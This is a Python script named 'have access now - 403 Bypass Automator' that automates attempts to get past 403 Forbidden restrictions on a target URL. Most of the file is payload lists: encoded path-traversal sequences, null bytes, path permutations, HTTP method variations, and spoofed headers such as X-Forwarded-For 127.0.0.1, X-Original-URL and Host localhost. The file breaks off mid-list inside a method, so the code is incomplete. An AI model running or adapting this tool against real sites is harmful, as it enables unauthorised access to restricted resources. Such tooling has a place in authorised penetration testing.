#!/usr/bin/env python3
"""
have access now - 403 Bypass Automator
Script para probar automáticamente diferentes técnicas de bypass de 403 Forbidden
Muestra el código de estado y resalta los bypasses que funcionan (200 OK)
Created by d0x
"""

import requests
import sys
import time
from urllib.parse import urlparse, urljoin
from colorama import init, Fore, Style

init(autoreset=True)

class BypassAutomator:
    def __init__(self, url):
        self.url = url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.original_status = None
        self.successful_bypasses = []
        
    def test_request(self, test_url, method='GET', headers=None, description=''):
        """Test a single request and return status code"""
        try:
            if headers:
                response = self.session.request(method, test_url, headers=headers, timeout=10, allow_redirects=False)
            else:
                response = self.session.request(method, test_url, timeout=10, allow_redirects=False)
            
            status = response.status_code
            size = len(response.content)
            
            return status, size
        except Exception as e:
            return None, 0
    
    def get_path_from_url(self):
        """Extract path from URL"""
        parsed = urlparse(self.url)
        return parsed.path if parsed.path else '/'
    
    def print_nuclei_style(self, tag, severity, target, description, status=None, size=None, extra_info=None):
        """Print in Nuclei-style format"""
        # Severity colors: critical=red, high=yellow, medium=cyan, info=blue, low=white
        severity_colors = {
            'critical': Fore.RED,
            'high': Fore.YELLOW,
            'medium': Fore.CYAN,
            'info': Fore.BLUE,
            'low': Fore.WHITE,
            'vulnerable': Fore.GREEN,
            'bypass': Fore.GREEN
        }
        
        color = severity_colors.get(severity.lower(), Fore.WHITE)
        
        # Determine if bypassed (status 200) or not bypassed
        if status:
            if status == 200:
                bypass_status = f"{Fore.GREEN}[BYPASSED]{Style.RESET_ALL}"
            else:
                bypass_status = f"{Fore.RED}[NOT BYPASSED]{Style.RESET_ALL}"
        else:
            bypass_status = ""
        
        # Format: [BYPASSED]/[NOT BYPASSED] [tag] [severity] target - description
        if status:
            print(f"{bypass_status} {Fore.CYAN}[{tag}]{Style.RESET_ALL} [{color}{severity.upper()}{Style.RESET_ALL}] {target} - {description} [{status}] [{size} bytes]")
        else:
            print(f"{Fore.CYAN}[{tag}]{Style.RESET_ALL} [{color}{severity.upper()}{Style.RESET_ALL}] {target} - {description}")
        
        if extra_info:
            for key, value in extra_info.items():
                print(f"  {Fore.YELLOW}{key}:{Style.RESET_ALL} {value}")
    
    def test_original(self):
        """Test original URL to get baseline"""
        status, size = self.test_request(self.url)
        self.original_status = status
        if status == 403:
            self.print_nuclei_style('403-bypass', 'info', self.url, 'Original request returns 403', status, size)
        else:
            self.print_nuclei_style('403-bypass', 'info', self.url, f'Original request returns {status}', status, size)
        print()
        return status == 403
    
    def test_url_encoding_bypasses(self):
        """Test URL encoding bypasses"""
        path = self.get_path_from_url()
        
        encoding_payloads = [
            ('%26', 'URL encoding %26 (&)'),
            ('%2F', 'URL encoding %2F (/)'),
            ('%5C', 'URL encoding %5C (\\)'),
            ('%3F', 'URL encoding %3F (?)'),
            ('%23', 'URL encoding %23 (#)'),
            ('%00', 'URL encoding %00 (null byte)'),
            ('%20', 'URL encoding %20 (space)'),
            ('%09', 'URL encoding %09 (tab)'),
        ]
        
        for payload, description in encoding_payloads:
            test_url = self.url + payload
            status, size = self.test_request(test_url, description=description)
            
            if status:
                if status == 200:
                    self.print_nuclei_style('403-bypass', 'vulnerable', test_url, description, status, size, {'technique': 'url-encoding', 'payload': payload})
                    self.successful_bypasses.append((test_url, description, status, size, 'url-encoding', payload))
                elif status != 403 and status != self.original_status:
                    self.print_nuclei_style('403-bypass', 'high', test_url, f'{description} - Different status', status, size, {'technique': 'url-encoding', 'payload': payload})
                    self.successful_bypasses.append((test_url, description, status, size, 'url-encoding', payload))
            time.sleep(3)
    
    def test_double_encoding_bypasses(self):
        """Test double encoding bypasses"""
        path = self.get_path_from_url()
        
        double_encoding = [
            ('%2526', 'Double encoding %2526'),
            ('%252F', 'Double encoding %252F'),
            ('%255C', 'Double encoding %255C'),
            ('%253F', 'Double encoding %253F'),
        ]
        
        for payload, description in double_encoding:
            test_url = self.url + payload
            status, size = self.test_request(test_url, description=description)
            
            if status:
                if status == 200:
                    self.print_nuclei_style('403-bypass', 'vulnerable', test_url, description, status, size, {'technique': 'double-encoding', 'payload': payload})
                    self.successful_bypasses.append((test_url, description, status, size, 'double-encoding', payload))
                elif status != 403 and status != self.original_status:
                    self.print_nuclei_style('403-bypass', 'high', test_url, f'{description} - Different status', status, size, {'technique': 'double-encoding', 'payload': payload})
                    self.successful_bypasses.append((test_url, description, status, size, 'double-encoding', payload))
            time.sleep(3)
    
    def generate_path_permutations(self, path, payload):
        """Generate all possible permutations of inserting payload in path"""
        permutations = []
        parsed = urlparse(self.url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Split path into segments
        path_segments = [seg for seg in path.strip('/').split('/') if seg]
        
        if not path_segments:
            # If path is empty or just '/', try payload at root
            permutations.append((f"/{payload}", f"Path permutation: /{payload}"))
            permutations.append((f"/{payload}/", f"Path permutation: /{payload}/"))
            return permutations
        
        # 1. Insert payload before each segment
        for i in range(len(path_segments)):
            new_segments = path_segments[:]
            new_segments.insert(i, payload)
            new_path = '/' + '/'.join(new_segments)
            permutations.append((new_path, f"Path permutation: payload before segment {i+1}"))
            permutations.append((new_path + '/', f"Path permutation: payload before segment {i+1} with trailing slash"))
        
        # 2. Insert payload after each segment
        for i in range(len(path_segments)):
            new_segments = path_segments[:]
            new_segments.insert(i + 1, payload)
            new_path = '/' + '/'.join(new_segments)
            permutations.append((new_path, f"Path permutation: payload after segment {i+1}"))
            permutations.append((new_path + '/', f"Path permutation: payload after segment {i+1} with trailing slash"))
        
        # 3. Insert payload at the beginning of each segment
        for i in range(len(path_segments)):
            new_segments = path_segments[:]
            new_segments[i] = payload + new_segments[i]
            new_path = '/' + '/'.join(new_segments)
            permutations.append((new_path, f"Path permutation: payload at start of segment {i+1}"))
        
        # 4. Insert payload at the end of each segment
        for i in range(len(path_segments)):
            new_segments = path_segments[:]
            new_segments[i] = new_segments[i] + payload
            new_path = '/' + '/'.join(new_segments)
            permutations.append((new_path, f"Path permutation: payload at end of segment {i+1}"))
        
        # 5. Insert payload at the end of the path
        permutations.append((path + payload, f"Path permutation: payload at end"))
        permutations.append((path + payload + '/', f"Path permutation: payload at end with trailing slash"))
        
        # 6. Insert payload at the beginning of the path
        permutations.append((f"/{payload}{path.lstrip('/')}", f"Path permutation: payload at start"))
        
        return permutations
    
    def test_path_permutation_bypasses(self):
        """Test path permutation bypasses - insert payloads in all possible positions"""
        path = self.get_path_from_url()
        
        # Payloads to test in all positions
        permutation_payloads = [
            ('..;', 'Path permutation with ..;'),
            ('..%2F', 'Path permutation with ..%2F'),
            ('..%252F', 'Path permutation with ..%252F'),
            ('%2e%2e%2f', 'Path permutation with %2e%2e%2f'),
            ('%2e%2e;', 'Path permutation with %2e%2e;'),
            ('..%2F;', 'Path permutation with ..%2F;'),
            ('..%5C', 'Path permutation with ..%5C'),
            ('..%255C', 'Path permutation with ..%255C'),
            ('%2e%2e%5c', 'Path permutation with %2e%2e%5c'),
            ('..%00', 'Path permutation with null byte'),
            ('%00', 'Path permutation with null byte'),
        ]
        
        for payload, base_description in permutation_payloads:
            permutations = self.generate_path_permutations(path, payload)
            
            for perm_path, description in permutations:
                parsed = urlparse(self.url)
                test_url = f"{parsed.scheme}://{parsed.netloc}{perm_path}"
                status, size = self.test_request(test_url, description=description)
                
                if status:
                    if status == 200:
                        self.print_nuclei_style('403-bypass', 'vulnerable', test_url, description, status, size, {'technique': 'path-permutation', 'payload': payload, 'position': perm_path})
                        self.successful_bypasses.append((test_url, description, status, size, 'path-permutation', payload))
                    elif status != 403 and status != self.original_status:
                        self.print_nuclei_style('403-bypass', 'high', test_url, f'{description} - Different status', status, size, {'technique': 'path-permutation', 'payload': payload, 'position': perm_path})
                        self.successful_bypasses.append((test_url, description, status, size, 'path-permutation', payload))
                time.sleep(3)  # Delay to avoid blocking
    
    def test_path_manipulation_bypasses(self):
        """Test path manipulation bypasses"""
        path = self.get_path_from_url()
        
        path_payloads = [
            # Basic characters
            ('/', 'Trailing slash'),
            ('//', 'Double slash'),
            ('///', 'Triple slash'),
            ('?', 'Question mark'),
            ('??', 'Double question'),
            ('???', 'Triple question'),
            ('#', 'Hash'),
            ('#/', 'Hash slash'),
            ('#/.', 'Hash dot'),
            ('#test', 'Hash test'),
            ('&', 'Ampersand'),
            (';', 'Semicolon'),
            (',', 'Comma'),
            ('-', 'Dash'),
            ('.', 'Dot'),
            # Encoded characters
            ('%00', 'Null byte'),
            ('%09', 'Tab'),
            ('%0A', 'Line feed'),
            ('%0D', 'Carriage return'),
            ('%20', 'Space'),
            ('%20/', 'Space slash'),
            ('%25', 'Percent'),
            ('%23', 'Hash encoded'),
            ('%26', 'Ampersand encoded'),
            ('%3f', 'Question encoded'),
            ('%61', 'Letter a encoded'),
            # Double encoded
            ('%2500', 'Double encoded null'),
            ('%2509', 'Double encoded tab'),
            ('%250A', 'Double encoded line feed'),
            ('%250D', 'Double encoded carriage return'),
            ('%2520', 'Double encoded space'),
            ('%2520%252F', 'Double encoded space slash'),
            ('%2525', 'Double encoded percent'),
            ('%2523', 'Double encoded hash'),
            ('%2526', 'Double encoded ampersand'),
            ('%253F', 'Double encoded question'),
            ('%2561', 'Double encoded letter a'),
            # Path traversal variations
            ('..;', 'Dots semicolon'),
            ('..;/', 'Dots semicolon slash'),
            ('..\;', 'Dots backslash'),
            ('..\;/', 'Dots backslash slash'),
            ('/..%3B/', 'Encoded semicolon traversal'),
            # Special characters
            ('~', 'Tilde'),
            ('°/', 'Degree slash'),
            # Extensions
            ('.css', 'CSS extension'),
            ('.html', 'HTML extension'),
            ('.json', 'JSON extension'),
            ('.php', 'PHP extension'),
            ('.random', 'Random extension'),
            ('.svc', 'SVC extension'),
            ('.svc?wsdl', 'SVC WSDL'),
            ('.wsdl', 'WSDL extension'),
            # Query parameters
            ('?WSDL', 'WSDL query'),
            ('?debug=1', 'Debug query 1'),
            ('?debug=true', 'Debug query true'),
            ('?param', 'Param query'),
            ('?testparam', 'Test param query'),
            # Special paths
            ('\/\/', 'Escaped slashes'),
            ('debug', 'Debug'),
            ('false', 'False'),
            ('null', 'Null'),
            ('true', 'True'),
            ('/*', 'Wildcard'),
            ('0', 'Zero'),
            ('1', 'One'),
        ]
        
        for payload, description in path_payloads:
            test_url = self.url + payload
            status, size = self.test_request(test_url, description=description)
            
            if status:
                if status == 200:
                    self.print_nuclei_style('403-bypass', 'vulnerable', test_url, description, status, size, {'technique': 'path-manipulation', 'payload': payload})
                    self.successful_bypasses.append((test_url, description, status, size, 'path-manipulation', payload))
                elif status != 403 and status != self.original_status:
                    self.print_nuclei_style('403-bypass', 'high', test_url, f'{description} - Different status', status, size, {'technique': 'path-manipulation', 'payload': payload})
                    self.successful_bypasses.append((test_url, description, status, size, 'path-manipulation', payload))
            time.sleep(3)
    
    def test_path_traversal_bypasses(self):
        """Test path traversal bypasses"""
        path = self.get_path_from_url()
        
        # Extraer partes del path
        path_parts = path.strip('/').split('/')
        if len(path_parts) > 0:
            base = '/' + '/'.join(path_parts[:-1]) if len(path_parts) > 1 else ''
            endpoint = path_parts[-1] if path_parts else ''
            
            traversal_payloads = [
                (f"{base}/../{endpoint}", 'Path traversal ../', '../'),
                (f"{base}/..%2F{endpoint}", 'Path traversal ..%2F', '..%2F'),
                (f"{base}/..%252F{endpoint}", 'Path traversal ..%252F', '..%252F'),
                (f"{base}/%2e%2e/{endpoint}", 'Path traversal %2e%2e/', '%2e%2e/'),
                (f"{base}/%2e%2e%2f{endpoint}", 'Path traversal %2e%2e%2f', '%2e%2e%2f'),
            ]
            
            parsed = urlparse(self.url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            for payload, description, payload_str in traversal_payloads:
                test_url = base_url + payload
                status, size = self.test_request(test_url, description=description)
                
                if status:
                    if status == 200:
                        self.print_nuclei_style('403-bypass', 'vulnerable', test_url, description, status, size, {'technique': 'path-traversal', 'payload': payload_str})
                        self.successful_bypasses.append((test_url, description, status, size, 'path-traversal', payload_str))
                    elif status != 403 and status != self.original_status:
                        self.print_nuclei_style('403-bypass', 'high', test_url, f'{description} - Different status', status, size, {'technique': 'path-traversal', 'payload': payload_str})
                        self.successful_bypasses.append((test_url, description, status, size, 'path-traversal', payload_str))
                time.sleep(3)
    
    def test_case_variations(self):
        """Test case sensitivity variations"""
        path = self.get_path_from_url()
        
        if path:
            parsed = urlparse(self.url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            case_variations = [
                (path.swapcase(), 'Case swap', 'swapcase'),
                (path.upper(), 'Uppercase', 'upper'),
                (path.lower(), 'Lowercase', 'lower'),
            ]
            
            for payload, description, payload_str in case_variations:
                test_url = base_url + payload
                status, size = self.test_request(test_url, description=description)
                
                if status:
                    if status == 200:
                        self.print_nuclei_style('403-bypass', 'vulnerable', test_url, description, status, size, {'technique': 'case-variation', 'payload': payload_str})
                        self.successful_bypasses.append((test_url, description, status, size, 'case-variation', payload_str))
                    elif status != 403 and status != self.original_status:
                        self.print_nuclei_style('403-bypass', 'high', test_url, f'{description} - Different status', status, size, {'technique': 'case-variation', 'payload': payload_str})
                        self.successful_bypasses.append((test_url, description, status, size, 'case-variation', payload_str))
                time.sleep(3)
    
    def test_http_methods(self):
        """Test different HTTP methods"""
        methods = ['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'TRACE', 'CONNECT', 'TRACK', 'UPDATE', 'LOCK', 'COPY', 'LABEL', 'MOVE', 'POUET', 'UNCHECKOUT', 'VERSION-CONTROL']
        
        for method in methods:
            status, size = self.test_request(self.url, method=method, description=f'HTTP Method {method}')
            
            if status:
                if status == 200:
                    self.print_nuclei_style('403-bypass', 'vulnerable', self.url, f'HTTP Method {method}', status, size, {'technique': 'http-method', 'method': method})
                    self.successful_bypasses.append((self.url, f'HTTP Method {method}', status, size, 'http-method', method))
                elif status != 403 and status != self.original_status:
                    self.print_nuclei_style('403-bypass', 'high', self.url, f'HTTP Method {method} - Different status', status, size, {'technique': 'http-method', 'method': method})
                    self.successful_bypasses.append((self.url, f'HTTP Method {method}', status, size, 'http-method', method))
            time.sleep(3)
    
    def test_bypass_headers(self):
        """Test bypass headers"""
        # All IPs to test
        test_ips = [
            '*', '0', '0.0.0.0', '0177.0000.0000.0001', '0177.1', '0x7F000001',
            '10.0.0.0', '10.0.0.1', '127.0.0.1', '127.0.0.1:443', '127.0.0.1:80',
            '127.1', '172.16.0.0', '172.16.0.1', '172.17.0.1', '192.168.0.2',
            '192.168.1.0', '192.168.1.1', '2130706433', '8.8.8.8', 'localhost',
            'localhost:443', 'localhost:80', 'norealhost', 'null'
        ]
        
        # All headers to test with IPs
        header_names = [
            'Access-Control-Allow-Origin', 'Base-Url', 'CF-Connecting-IP',
            'CF-Connecting_IP', 'Client-IP', 'Destination', 'Forwarded',
            'Forwarded-For', 'Forwarded-For-Ip', 'Host', 'Http-Url', 'Origin',
            'Profile', 'Proxy', 'Proxy-Host', 'Proxy-Url', 'Real-Ip', 'Redirect',
            'Referer', 'Referrer', 'Request-Uri', 'True-Client-IP', 'Uri', 'Url',
            'X-Arbitrary', 'X-Client-IP', 'X-Custom-IP-Authorization', 'X-Forward',
            'X-Forward-For', 'X-Forwarded', 'X-Forwarded-By', 'X-Forwarded-For',
            'X-Forwarded-For-Original', 'X-Forwarded-Host', 'X-Forwarded-Proto',
            'X-Forwarded-Server', 'X-Forwarder-For', 'X-Host', 'X-HTTP-DestinationURL',
            'X-HTTP-Host-Override', 'X-Original-Remote-Addr', 'X-Original-URL',
            'X-Originally-Forwarded-For', 'X-Originating-IP', 'X-Proxy-Url',
            'X-ProxyUser-Ip', 'X-Real-IP', 'X-Referrer', 'X-Remote-Addr',
            'X-Remote-IP', 'X-Rewrite-URL', 'X-WAP-Profile', 'X-Real-Ip', 'X-True-IP'
        ]
        
        # Test each header with common IPs (127.0.0.1, localhost, etc.)
        common_ips = ['127.0.0.1', 'localhost', '0.0.0.0', '127.1', '*']
        ip_headers = []
        
        for header_name in header_names:
            for ip in common_ips:
                ip_headers.append((header_name, ip))
        
        # Also test with multiple IPs for some headers
        multi_ip_headers = [
            ('X-Forwarded-For', '127.0.0.1, 68.180.194.242'),
            ('X-Originally-Forwarded-For', '127.0.0.1, 68.180.194.242'),
            ('X-Originating-IP', '127.0.0.1, 68.180.194.242'),
            ('Client-IP', '127.0.0.1, 68.180.194.242'),
            ('True-Client-IP', '127.0.0.1, 68.180.194.242'),
            ('X-WAP-Profile', '127.0.0.1, 68.180.194.242'),
            ('From', '127.0.0.1, 68.180.194.242'),
            ('Destination', '127.0.0.1, 68.180.194.242'),
            ('Proxy', '127.0.0.1, 68.180.194.242'),
            ('CF-Connecting_IP', '127.0.0.1, 68.180.194.242'),
            ('CF-Connecting-IP', '127.0.0.1, 68.180.194.242'),
        ]
        
        ip_headers.extend(multi_ip_headers)
        
        # Special headers
        ip_headers.append(('X-OReferrer', 'https%3A%2F%2Fwww.google.com%2F'))
        
        for header_name, header_value in ip_headers:
            headers = {header_name: header_value}
            status, size = self.test_request(self.url, headers=headers, description=f'Header {header_name}')
            
            if status:
                if status == 200:
                    self.print_nuclei_style('403-bypass', 'vulnerable', self.url, f'Header {header_name}', status, size, {'technique': 'header-bypass', 'header': f'{header_name}: {header_value}'})
                    self.successful_bypasses.append((self.url, f'Header {header_name}', status, size, 'header-bypass', f'{header_name}: {header_value}'))
                elif status != 403 and status != self.original_status:
                    self.print_nuclei_style('403-bypass', 'high', self.url, f'Header {header_name} - Different status', status, size, {'technique': 'header-bypass', 'header': f'{header_name}: {header_value}'})
                    self.successful_bypasses.append((self.url, f'Header {header_name}', status, size, 'header-bypass', f'{header_name}: {header_value}'))
            time.sleep(3)
        
        # Path Override Headers
        path = self.get_path_from_url()
        parsed = urlparse(self.url)
        domain = parsed.netloc
        
        path_headers = [
            ('X-Original-URL', path),
            ('X-Rewrite-URL', path),
            ('X-Forwarded-Prefix', path),
            ('X-Original-URL', f'/{path}'),  # With leading slash
            ('X-Rewrite-URL', f'/{path}'),
            ('Profile', f'http://{domain}'),
            ('X-Arbitrary', f'http://{domain}'),
            ('X-HTTP-DestinationURL', f'http://{domain}'),
            ('X-Forwarded-Proto', f'http://{domain}'),
            ('Referer', self.url),
            ('Content-Length', '0'),
        ]
        
        for header_name, header_value in path_headers:
            headers = {header_name: header_value}
            status, size = self.test_request(self.url, headers=headers, description=f'Header {header_name}')
            
            if status:
                if status == 200:
                    self.print_nuclei_style('403-bypass', 'vulnerable', self.url, f'Header {header_name}', status, size, {'technique': 'header-bypass', 'header': f'{header_name}: {header_value}'})
                    self.successful_bypasses.append((self.url, f'Header {header_name}', status, size, 'header-bypass', f'{header_name}: {header_value}'))
                elif status != 403 and status != self.original_status:
                    self.print_nuclei_style('403-bypass', 'high', self.url, f'Header {header_name} - Different status', status, size, {'technique': 'header-bypass', 'header': f'{header_name}: {header_value}'})
                    self.successful_bypasses.append((self.url, f'Header {header_name}', status, size, 'header-bypass', f'{header_name}: {header_value}'))
            time.sleep(3)
        
        # Host Header
        parsed = urlparse(self.url)
        host_headers = [
            ('Host', 'localhost'),
            ('Host', '127.0.0.1'),
            ('X-Host', '127.0.0.1'),
            ('X-Forwarded-Host', '127.0.0.1'),
        ]
        
        for header_name, header_value in host_headers:
            headers = {header_name: header_value}
            status, size = self.test_request(self.url, headers=headers, description=f'Header {header_name}')
            
            if status:
                if status == 200:
                    self.print_nuclei_style('403-bypass', 'vulnerable', self.url, f'Header {header_name}', status, size, {'technique': 'header-bypass', 'header': f'{header_name}: {header_value}'})
                    self.successful_bypasses.append((self.url, f'Header {header_name}', status, size, 'header-bypass', f'{header_name}: {header_value}'))
                elif status != 403 and status != self.original_status:
                    self.print_nuclei_style('403-bypass', 'high', self.url, f'Header {header_name} - Different status', status, size, {'technique': 'header-bypass', 'header': f'{header_name}: {header_value}'})
                    self.successful_bypasses.append((self.url, f'Header {header_name}', status, size, 'header-bypass', f'{header_name}: {header_value}'))
            time.sleep(3)
    
    def test_protocol_bypasses(self):
        """Test protocol-based bypasses (HTTP vs HTTPS)"""
        parsed = urlparse(self.url)
        path = self.get_path_from_url()
        domain = parsed.netloc
        
        # Test HTTP if original is HTTPS
        if parsed.scheme == 'https':
            http_url = f"http://{domain}{path}"
            status, size = self.test_request(http_url, description='Protocol HTTP')
            if status and (status == 200 or (status != 403 and status != self.original_status)):
                self.print_nuclei_style('403-bypass', 'vulnerable' if status == 200 else 'high', http_url, 'Protocol HTTP', status, size, {'technique': 'protocol-bypass', 'protocol': 'http'})
                self.successful_bypasses.append((http_url, 'Protocol HTTP', status, size, 'protocol-bypass', 'http'))
        
        # Test HTTPS if original is HTTP
        if parsed.scheme == 'http':
            https_url = f"https://{domain}{path}"
            status, size = self.test_request(https_url, description='Protocol HTTPS')
            if status and (status == 200 or (status != 403 and status != self.original_status)):
                self.print_nuclei_style('403-bypass', 'vulnerable' if status == 200 else 'high', https_url, 'Protocol HTTPS', status, size, {'technique': 'protocol-bypass', 'protocol': 'https'})
                self.successful_bypasses.append((https_url, 'Protocol HTTPS', status, size, 'protocol-bypass', 'https'))
        
        # Test X-Forwarded-Scheme headers
        scheme_headers = [
            ('X-Forwarded-Scheme', 'http'),
            ('X-Forwarded-Scheme', 'https'),
        ]
        
        for header_name, header_value in scheme_headers:
            headers = {header_name: header_value}
            status, size = self.test_request(self.url, headers=headers, description=f'Header {header_name}')
            if status and (status == 200 or (status != 403 and status != self.original_status)):
                self.print_nuclei_style('403-bypass', 'vulnerable' if status == 200 else 'high', self.url, f'Header {header_name}', status, size, {'technique': 'protocol-header', 'header': f'{header_name}: {header_value}'})
                self.successful_bypasses.append((self.url, f'Header {header_name}', status, size, 'protocol-header', f'{header_name}: {header_value}'))
            time.sleep(3)
    
    def test_port_bypasses(self):
        """Test port-based bypasses"""
        port_headers = [
            ('X-Forwarded-Port', '443'),
            ('X-Forwarded-Port', '4443'),
            ('X-Forwarded-Port', '80'),
            ('X-Forwarded-Port', '8080'),
            ('X-Forwarded-Port', '8443'),
        ]
        
        for header_name, header_value in port_headers:
            headers = {header_name: header_value}
            status, size = self.test_request(self.url, headers=headers, description=f'Header {header_name}')
            if status and (status == 200 or (status != 403 and status != self.original_status)):
                self.print_nuclei_style('403-bypass', 'vulnerable' if status == 200 else 'high', self.url, f'Header {header_name}', status, size, {'technique': 'port-bypass', 'header': f'{header_name}: {header_value}'})
                self.successful_bypasses.append((self.url, f'Header {header_name}', status, size, 'port-bypass', f'{header_name}: {header_value}'))
            time.sleep(3)
    
    def test_extended_url_encoding_bypasses(self):
        """Test extended URL encoding bypasses from bash script"""
        path = self.get_path_from_url()
        
        # Extended encoding payloads from bash script - COMPLETE LIST
        extended_encoding = [
            # Basic characters
            ('#?', 'Hash and question mark'),
            ('%09', 'Tab encoding'),
            ('%09%3b', 'Tab and semicolon encoding'),
            ('%09..', 'Tab and dots'),
            ('%09;', 'Tab and semicolon'),
            ('%20', 'Space encoding'),
            ('%23%3f', 'Hash and question mark encoding'),
            ('%252f%252f', 'Double encoded slashes'),
            ('%252f/', 'Double encoded slash with slash'),
            ('%2e%2e', 'Encoded dots'),
            ('%2e%2e/', 'Encoded dots with slash'),
            ('%2f', 'Encoded slash'),
            ('%2f%20%23', 'Encoded slash space hash'),
            ('%2f%23', 'Encoded slash hash'),
            ('%2f%2f', 'Encoded double slash'),
            ('%2f%3b%2f', 'Encoded slash semicolon slash'),
            ('%2f%3b%2f%2f', 'Encoded slash semicolon double slash'),
            ('%2f%3f', 'Encoded slash question'),
            ('%2f%3f/', 'Encoded slash question with slash'),
            ('%2f/', 'Encoded slash with slash'),
            ('%3b', 'Semicolon encoding'),
            ('%3b%09', 'Semicolon tab encoding'),
            ('%3b%2f%2e%2e', 'Semicolon encoded path traversal'),
            ('%3b%2f%2e%2e%2f%2e%2e%2f%2f', 'Complex semicolon path traversal'),
            ('%3b%2f%2e.', 'Semicolon encoded dot'),
            ('%3b%2f..', 'Semicolon encoded dots'),
            ('%3b/%2e%2e/..%2f%2f', 'Complex semicolon traversal'),
            ('%3b/%2e.', 'Semicolon encoded dot'),
            ('%3b/%2f%2f../', 'Semicolon encoded double slash'),
            ('%3b/..', 'Semicolon path traversal'),
            ('%3b//%2f../', 'Semicolon double encoded slash'),
            ('%3f%23', 'Question hash encoding'),
            ('%3f%3f', 'Double question encoding'),
            # Path traversal variations
            ('..', 'Double dots'),
            ('..%00/;', 'Null byte with semicolon'),
            ('..%00;/', 'Null byte semicolon'),
            ('..%09', 'Tab with dots'),
            ('..%0d/;', 'Carriage return with semicolon'),
            ('..%0d;/', 'Carriage return semicolon'),
            ('..%5c/', 'Backslash encoding'),
            ('..%ff/;', 'FF byte with semicolon'),
            ('..%ff;/', 'FF byte semicolon'),
            ('..;%00/', 'Dots semicolon null byte'),
            ('..;%0d/', 'Dots semicolon carriage return'),
            ('..;%ff/', 'Dots semicolon FF byte'),
            ('..;\\', 'Dots semicolon backslash'),
            ('..;\\;', 'Dots semicolon backslash semicolon'),
            ('..\\;', 'Dots backslash semicolon'),
            # Path with leading slash
            ('/%20#', 'Space hash'),
            ('/%20%23', 'Encoded space hash'),
            ('/%252e%252e%252f/', 'Triple encoded dots slash'),
            ('/%252e%252e%253b/', 'Triple encoded dots semicolon'),
            ('/%252e%252f/', 'Triple encoded dot slash'),
            ('/%252e%253b/', 'Triple encoded dot semicolon'),
            ('/%252e/', 'Triple encoded dot'),
            ('/%252f', 'Triple encoded slash'),
            ('/%2e%2e', 'Encoded dots'),
            ('/%2e%2e%3b/', 'Encoded dots semicolon'),
            ('/%2e%2e/', 'Encoded dots with slash'),
            ('/%2e%2f/', 'Encoded dot slash'),
            ('/%2e%3b/', 'Encoded dot semicolon'),
            ('/%2e%3b//', 'Encoded dot semicolon double slash'),
            ('/%2e/', 'Encoded dot'),
            ('/%2e//', 'Encoded dot double slash'),
            ('/%2f', 'Encoded slash'),
            ('/%3b/', 'Encoded semicolon'),
            # Path traversal with slash
            ('/..', 'Path traversal'),
            ('/..%2f', 'Encoded path traversal'),
            ('/..%2f..%2f', 'Double encoded traversal'),
            ('/..%2f..%2f..%2f', 'Triple encoded traversal'),
            ('/../', 'Path traversal with slash'),
            ('/../../', 'Double path traversal'),
            ('/../../../', 'Triple path traversal'),
            ('/../../..//', 'Triple traversal double slash'),
            ('/../..//', 'Double traversal double slash'),
            ('/../..//../', 'Complex traversal'),
            ('/../..;/', 'Double traversal semicolon'),
            ('/.././../', 'Traversal with current dir'),
            ('/../.;/../', 'Traversal with encoded current'),
            ('/..//', 'Traversal double slash'),
            ('/..//../', 'Traversal double slash traversal'),
            ('/..//../../', 'Complex traversal'),
            ('/..//..;/', 'Traversal double slash semicolon'),
            ('/../;/', 'Traversal semicolon'),
            ('/../;/../', 'Double traversal semicolon'),
            ('/..;%2f', 'Traversal semicolon encoded'),
            ('/..;%2f..;%2f', 'Double traversal semicolon encoded'),
            ('/..;%2f..;%2f..;%2f', 'Triple traversal semicolon encoded'),
            ('/..;/../', 'Traversal semicolon traversal'),
            ('/..;/..;/', 'Double traversal semicolon'),
            ('/..;//', 'Traversal semicolon double slash'),
            ('/..;//../', 'Traversal semicolon double slash traversal'),
            ('/..;//..;/', 'Complex traversal semicolon'),
            ('/..;/;/', 'Traversal semicolon semicolon'),
            ('/..;/;/..;/', 'Complex traversal semicolons'),
            # Current directory variations
            ('/.//', 'Current dir double slash'),
            ('/.;/', 'Current dir semicolon'),
            ('/.;//', 'Current dir semicolon double slash'),
            # Double slash variations
            ('//..', 'Double slash traversal'),
            ('//../../', 'Double slash double traversal'),
            ('//..;', 'Double slash traversal semicolon'),
            ('//./', 'Double slash current'),
            ('//.;/', 'Double slash current semicolon'),
            # Triple slash variations
            ('///..', 'Triple slash traversal'),
            ('///../', 'Triple slash traversal slash'),
            ('///..//', 'Triple slash traversal double slash'),
            ('///..;', 'Triple slash traversal semicolon'),
            ('///..;/', 'Triple slash traversal semicolon slash'),
            ('///..;//', 'Triple slash complex'),
            # Semicolon variations
            ('//;/', 'Double slash semicolon'),
            ('/;/', 'Semicolon slash'),
            ('/;//', 'Semicolon double slash'),
            ('/;x', 'Semicolon x'),
            ('/;x/', 'Semicolon x slash'),
            # x placeholder variations
            ('/x/../', 'x traversal'),
            ('/x/..//', 'x traversal double slash'),
            ('/x/../;/', 'x traversal semicolon'),
            ('/x/..;/', 'x traversal semicolon'),
            ('/x/..;//', 'x complex traversal'),
            ('/x/..;/;/', 'x complex traversal semicolons'),
            ('/x//../', 'x double slash traversal'),
            ('/x//..;/', 'x double slash traversal semicolon'),
            ('/x/;/../', 'x semicolon traversal'),
            ('/x/;/..;/', 'x semicolon complex'),
            # Semicolon at end variations
            (';', 'Semicolon'),
            (';%09', 'Semicolon tab'),
            (';%09..', 'Semicolon tab dots'),
            (';%09..;', 'Semicolon tab dots semicolon'),
            (';%09;', 'Semicolon tab semicolon'),
            (';%2F..', 'Semicolon encoded slash dots'),
            (';%2f%2e%2e', 'Semicolon encoded dots'),
            (';%2f%2e%2e%2f%2e%2e%2f%2f', 'Complex semicolon encoded'),
            (';%2f%2f/../', 'Semicolon encoded double slash'),
            (';%2f..', 'Semicolon encoded slash dots'),
            # Complex semicolon combinations from bash
            (';%2f..%2f%2e%2e%2f%2f', 'Semicolon encoded complex traversal'),
            (';%2f..%2f..%2f%2f', 'Semicolon encoded double traversal'),
            (';%2f..%2f/', 'Semicolon encoded traversal slash'),
            (';%2f..%2f/..%2f', 'Semicolon encoded traversal with encoded'),
            (';%2f..%2f/../', 'Semicolon encoded traversal'),
